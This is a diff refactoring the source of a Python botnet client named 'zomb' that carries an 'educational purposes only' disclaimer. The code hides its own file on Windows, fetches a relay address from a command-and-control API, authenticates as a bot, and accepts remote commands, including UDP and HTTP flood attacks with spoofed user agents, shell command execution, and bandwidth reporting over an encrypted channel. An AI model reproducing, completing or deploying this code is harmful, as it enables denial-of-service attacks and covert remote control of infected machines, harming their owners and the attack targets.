@@ -1,37 +1,54 @@
-from socket import socket as sock
-from socket import AF_INET, SOCK_STREAM, SOL_SOCKET, SO_KEEPALIVE, SOCK_DGRAM
+from socket import (
+    socket as sock,
+    AF_INET,
+    SOCK_STREAM,
+    SOL_SOCKET,
+    SO_KEEPALIVE,
+    SOCK_DGRAM,
+)
 from threading import Thread
 from time import sleep, time
-from os import system, path as ospath
+from os import (
+    system,
+    path as ospath,
+)
 from speedtest import Speedtest
 from json import load
 from cryptography.fernet import Fernet
-from random import uniform, choice, randint, random
-from requests import get as rget
+from random import (
+    uniform,
+    choice,
+    randint,
+    random,
+)
+from requests import (
+    get as rget,
+    Response,
+)
 from tempfile import gettempdir
 from sys import argv
 from ctypes import windll
-from psutil import process_iter, NoSuchProcess, AccessDenied, ZombieProcess
+from psutil import (
+    process_iter,
+    NoSuchProcess,
+    AccessDenied,
+    ZombieProcess,
+)
 
+__filename__ = "zomb"
+__legit__ = "I am in no way responsible for anything you do with it and I deny responsibility for any damage it may cause, my program is for educational purposes only, I do not endorse any other use."
 
+# ============== CONFIG ====>
 
-__filename__="zomb"
-__version__="2.0"
-__author__="4lxprime"
-__legit__="I am in no way responsible for anything you do with it and I deny responsibility for any damage it may cause, my program is for educational purposes only, I do not endorse any other use."
-
-
-
-# Configuration
-RELAY_PORT: int = 5001
-API_URL: str = "http://localhost/phybot/api/v2"
+RELAY_PORT: int = 5000
+API_URL: str = "http://127.0.0.1:8052/v3"
 URL_KEY: str = "VEIDVOE9oN8O3C4TnU2RIN1O0rF82mU6RuJwHFQ6GH5mF4NQ3pZ8Z6R7A8dL0"
-KEY: str = "b'gAAAAABixrd26TgeuuQmRhjWorB1oea-lO950B8hWYNHSTL2NvA3RW7A9MWAJXmDOeTJW9z5AWMp2pR0GHZqGPG36W2tXqPpLWkunwvc4CV8z5eJ0LNk5BU='"
+PASSWD: str = "gAAAAABixrd26TgeuuQmRhjWorB1oea-lO950B8hWYNHSTL2NvA3RW7A9MWAJXmDOeTJW9z5AWMp2pR0GHZqGPG36W2tXqPpLWkunwvc4CV8z5eJ0LNk5BU="
 ENC_KEY: str = "BkpVa0VQa4iXquxMtbWKHDKdyjWmZ6BGb7AM94ED_go="
 ENC_KEY_D: str = "kg6QH9EBtZUziQ8DdEqwnCknt7lKTfpc2zEEvb3Imms="
 
 PAYLOAD_1: str = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" # 100 * 1oct request
-PAYLOAD: str = 150*PAYLOAD_1
+PAYLOAD: str = 150 * PAYLOAD_1 # 15ko
 
 BASE_UA: list[str] = [
     'Mozilla/%.1f (Windows; U; Windows NT {0}; en-US; rv:%.1f.%.1f) Gecko/%d0%d Firefox/%.1f.%.1f'.format(uniform(5.0, 10.0)),
@@ -43,23 +60,26 @@ BASE_UA: list[str] = [
 
 DEBUG: bool = True
 
-raddr: list = []
-stu: list = []
+relay_address: list[str] = []
+st_status: list = []
 old_gen_key: list[str] = []
 gen_key: list[str] = []
 
+speed: list[int] = [0]
+
 try:
-    speed=[0]
     Speedtest()
-    stu.append(True)
-except:
-    speed=[0]
-    stu.append(False)
+    st_status.append(True)
+except: st_status.append(False)
     
-FERNET=Fernet(ENC_KEY)
-FERNET_D=Fernet(ENC_KEY_D)
+FERNET = Fernet(ENC_KEY)
+FERNET_D = Fernet(ENC_KEY_D)
 
+# ============== CODE ====>
 
+class Bot():
+    def __init__(self) -> None:
+        pass
 
 def hide():
     windll.kernel32.SetFileAttributesW(argv[0], 2)
@@ -111,9 +131,7 @@ def dos(
         case "UDP":
             log("UDP")
             while time() < tps:
-                try:
-                    s.sendto(bytes(PAYLOAD, "utf-8"), attack)
-
+                try: s.sendto(bytes(PAYLOAD, "utf-8"), attack)
                 except: pass
 
         case "HTTP":
@@ -128,106 +146,108 @@ def dos(
         case _:
             log("Unknown")
             while time() < tps:
-                try:
-                    s.sendto(bytes(PAYLOAD, "utf-8"), attack)
-
+                try: s.sendto(bytes(PAYLOAD, "utf-8"), attack)
                 except: pass
 
-def speedtest() -> None:
-    stu.clear()
+def do_speedtest() -> None:
+    st_status.clear()
 
     try:
         Speedtest()
-        stu.append(True)
+        st_status.append(True)
 
-    except: stu.append(False)
+    except: st_status.append(False)
 
-def _stu():
+def loop_speedtest():
     while 1:
-        for i in stu:
-            if i:
-                try:
-                    test: Speedtest = Speedtest()
-                    net: float = test.upload()
-                    net: float = round(net / 8000, 3) # but here in mbps
+        try:
+            speedtest: Speedtest = Speedtest()
+            net: float = speedtest.upload()
+            net: float = round(net / 8000, 3) # but here in mbps
 
-                    if sum(speed) != 0: speed.clear()
-                    
-                    speed.append(net)
+            if sum(speed) != 0: speed.clear()
 
-                    log(sum(speed))
+            speed.append(net)
 
-                except: pass
+            log(sum(speed))
 
-                sleep(160)
+        except: pass
 
-def getkey() -> None:
+        sleep(160)
+
+def loop_getkey() -> None:
     while 1:
-        for i in raddr:
-            url: str = f"{API_URL}/gkey.php?urlkey={URL_KEY}&rip={i}"
-            res: str = rget(url, timeout=5000).text
-            
-            if res != "error":
-                gen_key.clear()
-                gen_key.append(res)
+        if len(relay_address) != 0: relay_ip: str = relay_address[0]
+        else: break
 
-            else: log(f"error: {res}")
+        res: Response = rget(
+            f"{API_URL}/get_swap_key?urlkey={URL_KEY}&relay_ip={relay_ip}",
+            timeout=5000,
+        )
+
+        if res.status_code != 200:
+            gen_key.clear()
+            gen_key.append(res)
+
+        else: log(f"error: {res.text}")
 
         sleep(600)
 
 def main() -> None:
-    c2: sock = sock(AF_INET, SOCK_STREAM)
-    c2.setsockopt(SOL_SOCKET, SO_KEEPALIVE, 1)
+    relay: sock = sock(AF_INET, SOCK_STREAM)
+    relay.setsockopt(SOL_SOCKET, SO_KEEPALIVE, 1)
 
     while 1:
         try:
-            RELAY_ADDR: str = rget(f"{API_URL}/dispatch.php?urlkey={URL_KEY}", timeout=5000).text
+            RELAY_IP: str = rget(f"{API_URL}/dispatch?urlkey={URL_KEY}", timeout=5000).text
 
-            raddr.clear()
-            raddr.append(RELAY_ADDR)
+            relay_address.clear()
+            relay_address.append(RELAY_IP)
 
-            c2.connect((RELAY_ADDR, RELAY_PORT))
+            relay.connect((RELAY_IP, RELAY_PORT))
 
-            log((RELAY_ADDR, RELAY_PORT))
+            log((RELAY_IP, RELAY_PORT))
 
             while 1:
-                data: str = c2.recv(1024).decode()
+                data: str = relay.recv(1024).decode()
 
                 if 'Username' in data:
-                    c2.send('BOT'.encode())
+                    relay.send('BOT'.encode())
                     log("send bot")
                     break
 
             while 1:
-                data: str = c2.recv(1024).decode()
+                data: str = relay.recv(1024).decode()
 
                 if 'Password' in data:
-                    c2.send('\xff\xff\xff\xff\75'.encode('cp1252'))
+                    relay.send('\xff\xff\xff\xff\75'.encode('cp1252'))
                     log("send bot string")
                     break
 
             break
+
         except:
             sleep(240)
 
     while 1:
         try:
-            data: str = c2.recv(1024).decode()
+            data: str = relay.recv(1024).decode()
             
-            if not data: break
+            if not data: continue
             
             log(data)
             
             match True:
                 case data.startswith("b'gAAA"):
                     try:
-                        data: str = data.replace("b'gAAA", "gAAA").replace("'", "").encode()
+                        data = data[2:-1]
                         data = crypt_d(data, encrypt=False).decode()
 
                     except Exception as e:
                         log(e)
+                        continue
 
-                case data.startswith("GK"):
+                case data.startswith("GK"): # generate key = first swap key
                     data = data.replace("GK", "")
 
                     if len(gen_key) != 0:
@@ -304,10 +324,10 @@ def main() -> None:
                     ]).start()
 
                 case 'PING':
-                    c2.send(f'PONG[p:{KEY}]'.encode())
+                    relay.send(f'PONG[p:{PASSWD}]'.encode())
 
                 case 'NETSPEED':
-                    c2.send(str(round(sum(speed))).encode())
+                    relay.send(str(round(sum(speed))).encode())
 
                 case 'CMD':
                     cmd: str = data.replace("CMD ", "")
@@ -361,7 +381,7 @@ def main() -> None:
 
         except: break
 
-    c2.close()
+    relay.close()
     main()
 
 class netblock():
@@ -384,9 +404,9 @@ if __name__ == '__main__':
     try:
         print(f"\nLegit: {__legit__}\n")
 
-        Thread(target=_stu).start()
-        Thread(target=speedtest).start()
-        Thread(target=getkey).start()
+        Thread(target=loop_speedtest).start()
+        Thread(target=do_speedtest).start()
+        Thread(target=loop_getkey).start()
 
         hide()
         main()
